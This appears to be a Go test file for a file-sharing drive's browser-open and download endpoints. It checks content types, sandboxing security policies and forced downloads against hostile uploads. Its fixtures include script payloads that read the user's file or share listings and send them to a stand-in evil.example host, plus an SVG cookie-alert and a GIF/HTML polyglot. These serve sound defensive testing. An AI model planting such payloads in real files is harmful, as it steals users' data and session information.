package test

import (
	"bytes"
	"fmt"
	"mime"
	"net/http"
	"strings"
	"testing"

	"github.com/neonjelly-co/superit-drive/test/harness"
)

// openPath is the address that shows a file in the browser, as the interface links it.
func openPath(placeID, itemID int64) string {
	return fmt.Sprintf("/api/places/%d/items/%d/open", placeID, itemID)
}

// The policies the Drive sends with a file's bytes, written out here rather than taken from the Drive.
const (
	sandboxedPolicy = "default-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'; sandbox"
	playablePolicy  = "default-src 'none'; media-src 'self'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'; sandbox allow-same-origin"
)

// sent is what an answer carrying a file's bytes says about them.
type sent struct {
	contentType, disposition, policy string
}

// headersOf checks the headers every answer with a file's bytes carries, and returns the ones that depend on the file.
func headersOf(t *testing.T, what string, res harness.Response, name string, content []byte) sent {
	t.Helper()
	if res.Status != http.StatusOK {
		t.Fatalf("%s: got %d %s", what, res.Status, res.Body)
	}
	if !bytes.Equal(res.Body, content) {
		t.Errorf("%s: the body is not the file's bytes", what)
	}
	for header, want := range map[string]string{
		"X-Content-Type-Options":       "nosniff",
		"Cross-Origin-Resource-Policy": "same-origin",
		"Cache-Control":                "private, no-store",
		"Referrer-Policy":              "same-origin",
		"Accept-Ranges":                "bytes",
	} {
		if got := res.Header.Values(header); len(got) != 1 || got[0] != want {
			t.Errorf("%s: %s is %q, want %q", what, header, got, want)
		}
	}
	if n := len(res.Header.Values("Content-Security-Policy")); n != 1 {
		t.Errorf("%s: %d Content-Security-Policy headers, want exactly one", what, n)
	}
	kind, params, err := mime.ParseMediaType(res.Header.Get("Content-Disposition"))
	if err != nil || params["filename"] != name {
		t.Errorf("%s: Content-Disposition %q does not name the file %q", what, res.Header.Get("Content-Disposition"), name)
	}
	return sent{contentType: res.Header.Get("Content-Type"), disposition: kind, policy: res.Header.Get("Content-Security-Policy")}
}

var downloaded = sent{"application/octet-stream", "attachment", sandboxedPolicy}

// Only a fixed list of kinds opens in the browser, decided by the extension of the name and nothing else, each with
// the one content type the list gives it, under a policy that lets nothing run. Everything else, web pages and SVG
// images included, is sent to be saved. A download is always sent to be saved, whatever it is and however it is asked
// for. The files here are hostile: what they hold is a web page with a script, whatever their name says.
func TestOnlyAFixedListOfKindsOpensInTheBrowser(t *testing.T) {
	t.Parallel()
	d := harness.Start(t, reka)
	placeID, _ := myFiles(t, d, reka)
	c := d.As(reka)

	page := []byte(`<!doctype html><html><body><script>fetch("/api/places").then(r => r.text()).then(t => navigator.sendBeacon("https://evil.example", t))</script></body></html>`)
	svg := []byte(`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>`)
	// A GIF that is also a script and a page: browsers have run such files as HTML when they guessed the type.
	polyglot := []byte("GIF89a/*\x01\x00\x01\x00\x00\xff\xff\xff*/=1;alert(document.domain)//<html><script>alert(1)</script>")

	image := func(t string) sent { return sent{t, "inline", sandboxedPolicy} }
	media := func(t string) sent { return sent{t, "inline", playablePolicy} }
	text := sent{"text/plain; charset=utf-8", "inline", sandboxedPolicy}
	cases := []struct {
		name    string
		content []byte
		opens   bool
		want    sent // from …/open
	}{
		// What the list names opens, with its own content type, whatever the file holds.
		{"Invoice.png", page, true, image("image/png")},
		{"Photo.jpg", page, true, image("image/jpeg")},
		{"Photo.jpeg", page, true, image("image/jpeg")},
		{"Animation.gif", polyglot, true, image("image/gif")},
		{"Picture.webp", page, true, image("image/webp")},
		{"Picture.avif", page, true, image("image/avif")},
		{"Scan.bmp", page, true, image("image/bmp")},
		{"Offer.pdf", page, true, image("application/pdf")},
		{"Notes.txt", page, true, text},
		{"Server.log", page, true, text},
		{"README.md", page, true, text},
		{"Clip.mp4", page, true, media("video/mp4")},
		{"Clip.m4v", page, true, media("video/mp4")},
		{"Clip.webm", page, true, media("video/webm")},
		{"Song.mp3", page, true, media("audio/mpeg")},
		{"Song.m4a", page, true, media("audio/mp4")},
		{"Song.aac", page, true, media("audio/aac")},
		{"Song.wav", page, true, media("audio/wav")},
		{"Song.flac", page, true, media("audio/flac")},
		{"Song.ogg", page, true, media("audio/ogg")},
		{"Song.oga", page, true, media("audio/ogg")},
		{"Song.opus", page, true, media("audio/ogg")},
		// In any case, and only the last extension counts.
		{"Invoice.PnG", page, true, image("image/png")},
		{"OFFER.PDF", page, true, image("application/pdf")},
		{"Clip.Mp4", page, true, media("video/mp4")},
		{"Report.html.png", page, true, image("image/png")},
		{"Árvíztűrő tükörfúrógép.txt", page, true, text},
		// Web pages, SVG, XML, scripts and everything else the list does not name are sent to be saved.
		{"Page.html", page, false, downloaded},
		{"Page.HTM", page, false, downloaded},
		{"Page.xhtml", page, false, downloaded},
		{"Drawing.svg", svg, false, downloaded},
		{"Drawing.SVG", svg, false, downloaded},
		{"Drawing.svgz", svg, false, downloaded},
		{"Data.xml", page, false, downloaded},
		{"Style.xsl", page, false, downloaded},
		{"Script.js", page, false, downloaded},
		{"Module.mjs", page, false, downloaded},
		{"Flash.swf", page, false, downloaded},
		{"Report.pdf.html", page, false, downloaded},
		{"Photo.png.svg", svg, false, downloaded},
		{"Scan.tiff", page, false, downloaded},
		{"Clip.mov", page, false, downloaded},
		{"Clip.ogv", page, false, downloaded},
		{"Table.csv", page, false, downloaded},
		{"Data.json", page, false, downloaded},
		{"Letter.docx", page, false, downloaded},
		// Names that only look like it.
		{".png", page, false, downloaded},                     // a name with no extension
		{"Photo.png.", page, false, downloaded},               // a dot at the end
		{"Photo.png ", page, false, downloaded},               // a space at the end
		{"Photo.\uff50\uff4e\uff47", page, false, downloaded}, // full-width letters
		{"Photo.pn\u0261", page, false, downloaded},           // a Latin script g
		{"Photo.p\u200bng", page, false, downloaded},          // a zero-width space
		{"png", page, false, downloaded},
		{"Photo", page, false, downloaded},
	}
	ids := map[string]int64{}
	for _, f := range cases {
		// The upload says it is a web page; the Drive never takes a type from it.
		res := c.With("Content-Type", "text/html").Do(t, http.MethodPost, uploadPath(placeID, f.name), bytes.NewReader(f.content))
		if res.Status != http.StatusCreated {
			t.Fatalf("uploading %q: got %d %s", f.name, res.Status, res.Body)
		}
		var it itemJSON
		res.JSON(t, &it)
		ids[f.name] = it.ID
	}
	opens := map[string]bool{}
	for _, it := range list(t, c, placeID, 0).Items {
		opens[it.Name] = it.Opens
	}
	for _, f := range cases {
		if opens[f.name] != f.opens {
			t.Errorf("%q: the listing says it opens %v, want %v", f.name, opens[f.name], f.opens)
		}
		if got := headersOf(t, "opening "+f.name, c.Get(t, openPath(placeID, ids[f.name])), f.name, f.content); got != f.want {
			t.Errorf("opening %q: sent as %+v, want %+v", f.name, got, f.want)
		}
		// A download is always saved: however the request is made, it never opens.
		for _, ask := range []struct{ query, accept string }{{"", ""}, {"?inline=1&open=1&disposition=inline", ""}, {"", "image/png,text/html"}} {
			cl := c
			if ask.accept != "" {
				cl = c.With("Accept", ask.accept)
			}
			res := cl.Get(t, downloadPath(placeID, ids[f.name])+ask.query)
			if got := headersOf(t, "downloading "+f.name, res, f.name, f.content); got != downloaded {
				t.Errorf("downloading %q (%q, Accept %q): sent as %+v, want %+v", f.name, ask.query, ask.accept, got, downloaded)
			}
		}
	}

	// A file put on the storage directly, which the storage itself serves as a web page: the Drive sends it to be saved.
	d.Storage.Put(t, rekasTop+"/Direct.html", string(page))
	d.Storage.Put(t, rekasTop+"/Direct.svg", string(svg))
	for _, it := range list(t, c, placeID, 0).Items {
		if it.Name != "Direct.html" && it.Name != "Direct.svg" {
			continue
		}
		content := page
		if it.Name == "Direct.svg" {
			content = svg
		}
		if got := headersOf(t, "opening "+it.Name, c.Get(t, openPath(placeID, it.ID)), it.Name, content); got != downloaded {
			t.Errorf("opening %s, put on the storage directly: sent as %+v, want %+v", it.Name, got, downloaded)
		}
	}

	// Renamed, a file opens as its new name says: a picture renamed to a web page is saved, not shown.
	ok(t, "renaming Invoice.png to Invoice.html", rename(t, c, placeID, ids["Invoice.png"], "Invoice.html"))
	if got := headersOf(t, "opening Invoice.html", c.Get(t, openPath(placeID, ids["Invoice.png"])), "Invoice.html", page); got != downloaded {
		t.Errorf("opening Invoice.png renamed to Invoice.html: sent as %+v, want %+v", got, downloaded)
	}

	// A folder does not open, and the answer is not a file's.
	folder := madeFolder(t, c, placeID, 0, "Photos.png")
	if res := c.Get(t, openPath(placeID, folder.ID)); res.Status != http.StatusNotFound || !strings.Contains(errorOf(t, res), "folder") {
		t.Errorf("opening a folder: got %d %s", res.Status, res.Body)
	}
	// A HEAD says the same as a GET, without the bytes.
	res := c.Do(t, http.MethodHead, openPath(placeID, ids["Clip.mp4"]), nil)
	if res.Status != http.StatusOK || res.Header.Get("Content-Type") != "video/mp4" || res.Header.Get("Content-Security-Policy") != playablePolicy || len(res.Body) != 0 {
		t.Errorf("HEAD of Clip.mp4: %d %v", res.Status, res.Header)
	}
}

// A video or a sound seeks: what opens in the browser answers a Range with that part, as a download does.
func TestAVideoOpenedInTheBrowserSeeks(t *testing.T) {
	t.Parallel()
	d := harness.Start(t, reka)
	placeID, _ := myFiles(t, d, reka)
	c := d.As(reka)
	content := randomBytes(t, 1<<20)
	clip := uploaded(t, c, placeID, "Holiday.mp4", content)

	res := c.With("Range", "bytes=1000-1999").Get(t, openPath(placeID, clip.ID))
	if res.Status != http.StatusPartialContent || !bytes.Equal(res.Body, content[1000:2000]) ||
		res.Header.Get("Content-Range") != fmt.Sprintf("bytes 1000-1999/%d", len(content)) || res.Header.Get("Content-Type") != "video/mp4" ||
		res.Header.Get("Content-Security-Policy") != playablePolicy || res.Header.Get("X-Content-Type-Options") != "nosniff" {
		t.Fatalf("a part of Holiday.mp4: got %d, %d bytes, %v", res.Status, len(res.Body), res.Header)
	}
	res = c.With("Range", fmt.Sprintf("bytes=%d-", len(content)-10)).Get(t, openPath(placeID, clip.ID))
	if res.Status != http.StatusPartialContent || !bytes.Equal(res.Body, content[len(content)-10:]) {
		t.Fatalf("the end of Holiday.mp4: got %d, %d bytes", res.Status, len(res.Body))
	}
	if res := c.With("Range", fmt.Sprintf("bytes=%d-", len(content)+10)).Get(t, openPath(placeID, clip.ID)); res.Status != http.StatusRequestedRangeNotSatisfiable {
		t.Fatalf("a part after the end: got %d", res.Status)
	}
}

// A member uploads a hostile file where another member can open it: in a shared folder, and in a folder shared with
// them. Whoever opens it gets it with the list's type and policy, or to be saved; and someone who may not open it gets
// the one answer for what is not there.
func TestAHostileFileFromAnotherMemberOpensOnlyAsTheListSays(t *testing.T) {
	t.Parallel()
	d := harness.Start(t, reka, bence, dora)
	b, o := d.As(bence), d.As(dora)
	page := []byte(`<html><script>fetch("/api/shared-with-me").then(r=>r.text()).then(t=>fetch("https://evil.example/?"+t))</script></html>`)

	team := madeSharedFolder(t, b, "Team")
	ok(t, "Dóra a viewer of Team", share(t, b, team.ID, 0, dora, "viewer"))
	planted := map[string]itemJSON{
		"Agenda.png":  uploadedInto(t, b, team.ID, 0, "Agenda.png", page),
		"Agenda.html": uploadedInto(t, b, team.ID, 0, "Agenda.html", page),
		"Agenda.svg":  uploadedInto(t, b, team.ID, 0, "Agenda.svg", page),
	}
	want := map[string]sent{
		"Agenda.png":  {"image/png", "inline", sandboxedPolicy},
		"Agenda.html": downloaded,
		"Agenda.svg":  downloaded,
	}
	for name, it := range planted {
		if got := headersOf(t, "Dóra opening "+name, o.Get(t, openPath(team.ID, it.ID)), name, page); got != want[name] {
			t.Errorf("Dóra opening %s from Bence: sent as %+v, want %+v", name, got, want[name])
		}
	}

	// In Bence's My files, shared with Dóra one folder deep: she opens what is in it, and nothing beside it.
	x := bencesFiles(t, d)
	ok(t, "sharing Bakery with Dóra", share(t, b, x.place, x.bakery.ID, dora, "viewer"))
	inside := uploadedInto(t, b, x.place, x.y2026.ID, "Statement.pdf", page)
	if got := headersOf(t, "Dóra opening Statement.pdf", o.Get(t, openPath(x.place, inside.ID)), "Statement.pdf", page); got != (sent{"application/pdf", "inline", sandboxedPolicy}) {
		t.Errorf("Dóra opening Statement.pdf: sent as %+v", got)
	}
	missing := o.Get(t, openPath(x.place, inside.ID+1000))
	for what, id := range map[string]int64{"Price list.pdf, beside Bakery": x.prices.ID, "Notes.txt, at the top": x.notes.ID, "Secret.txt": x.secret.ID} {
		sameAs(t, "Dóra opening "+what, o.Get(t, openPath(x.place, id)), missing)
	}
	// Réka, a project admin, cannot open Bence's My files either.
	sameAs(t, "Réka opening Statement.pdf", d.As(reka).Get(t, openPath(x.place, inside.ID)), d.As(reka).Get(t, openPath(x.place, inside.ID+1000)))
}
